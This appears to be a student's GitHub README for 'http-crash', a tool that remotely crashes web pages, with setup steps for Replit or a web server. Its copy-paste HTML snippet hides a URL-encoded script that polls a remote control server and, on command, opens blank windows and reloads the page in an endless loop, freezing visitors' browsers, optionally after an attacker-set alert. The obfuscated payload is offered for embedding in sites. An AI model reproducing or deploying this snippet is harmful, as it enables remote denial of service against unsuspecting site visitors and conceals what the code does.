# http-crash
**Do not copy from main directory**

What started it as a thing to pass the time in robotics class is now I think I actually care about which is rare.

 so I have made three different versions of it
 
 ## Read me
 
 this was made to control the crashing in other games [Sketchboss](https://github.com/Awashcard0/Sketchboss) and [slope](https://github.com/Awashcard0/slope-test) it didn't end up working but I eventually revisited it when I was working on home thing for my website and i decided to fix it and now were here.

 ## Legacy

 Inside the legacy folder you'll find the original. This version read the file hosted on the web server (Cloudflare pages) that I had it set up on. It rather the file on the web server and not from the repo because it would view from the cache or somthing

 ## Current

 The current version can be controlled by a node js web server. The current version also has a feature where you can show an alert before crashing. This can be ran on a normal web server or can be ran on replit i'll show both

 ### Replit

 Replit is pretty simple

 1. Click on [this link](https://replit.com/@Awashcard0/Crash-controle) and fork the repl
 2. In replit click on secrets > create new secret > name is PASS all uppercase > in value put whatever you want the password to be > save
 3. Then enter your repls URL into the URL variable on the web page

 ### non replit / web-server

 By the point that you're putting this on a web server you should probably know what to do. If you don't just enter the URL to wherever this is configured. Download it from the web server folder

 ### JS snippet

 Copy the code and put it in your site

 ```html
<script>
// enter url here
var url = "URL HERE"
</script>
<script>
document.write(unescape('%3Cscript%3E%0Ahello%28%29%3B%0A%0Aasync%20function%20hello%28%29%20%7B%0A%20%20while%20%28true%29%20%7B%0A%20%20%20%20await%20ya%28%29%3B%0A%20%20%20%20await%20sleep%285000%29%3B%0A%20%20%7D%0A%7D%0A%0Alet%20msgWait%20%3D%20false%0A%0Aasync%20function%20ya%28%29%20%7B%0A%20%20let%20mode%20%3D%20await%20get%28url%20+%20%22/val%22%29%3B%0A%0A%20%20if%20%28mode.includes%28%22ym%22%29%29%20%7B%0A%20%20%20%20window.open%28%22about%3Ablank%22%29%0A%0A%20%20%20%20%20%20%20%20while%281%29location.reload%281%29%0A%0A%20%20%20%20alert%28await%20get%28url%20+%20%22/msg%22%29%29%0A%0A%20%20%7D%20else%20if%20%28mode.includes%28%22y%22%29%29%20%7B%0A%20%20%20%20window.open%28%22about%3Ablank%22%29%0A%0A%20%20%20%20%20%20%20%20while%281%29location.reload%281%29%0A%0A%20%20%7D%20else%20if%20%28mode.includes%28%22m%22%29%29%20%7B%0A%0A%20%20%20%20if%20%28%21msgWait%29%20%7B%0A%20%20%20%20alert%28await%20get%28url%20+%20%22/msg%22%29%29%0A%20%20%20%20msgWait%28%29%3B%0A%20%20%20%20%7D%0A%20%20%7D%20else%20%7B%0A%0A%20%20%7D%0A%7D%0A%0Afunction%20get%28curl%29%20%7B%0A%20%20return%20new%20Promise%28%28resolve%2C%20reject%29%20%3D%3E%20%7B%0A%20%20%20%20const%20xhr%20%3D%20new%20XMLHttpRequest%28%29%3B%0A%20%20%20%20xhr.open%28%27GET%27%2C%20curl%29%3B%0A%20%20%20%20xhr.onload%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20if%20%28xhr.status%20%3D%3D%3D%20200%29%20%7B%0A%20%20%20%20%20%20%20%20resolve%28xhr.responseText%29%3B%0A%20%20%20%20%20%20%7D%20else%20%7B%0A%20%20%20%20%20%20%20%20reject%28%27Request%20failed.%20Returned%20status%20code%3A%27%2C%20xhr.status%29%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%3B%0A%20%20%20%20xhr.onerror%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20reject%28%27Request%20failed.%20There%20was%20a%20network%20error.%27%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20xhr.send%28%29%3B%0A%20%20%7D%29%3B%0A%7D%0A%0Afunction%20sleep%28ms%29%20%7B%0A%20%20return%20new%20Promise%28resolve%20%3D%3E%20setTimeout%28resolve%2C%20ms%29%29%3B%0A%7D%0A%0Afunction%20msgWait%28%29%3B%20%7B%0A%20%20msgWait%20%3D%20true%0A%20%20sleep%2810000%29%0A%20%20msgWait%20%3D%20false%0A%7D%0A%3C/script%3E%0A'))
</script>

 ```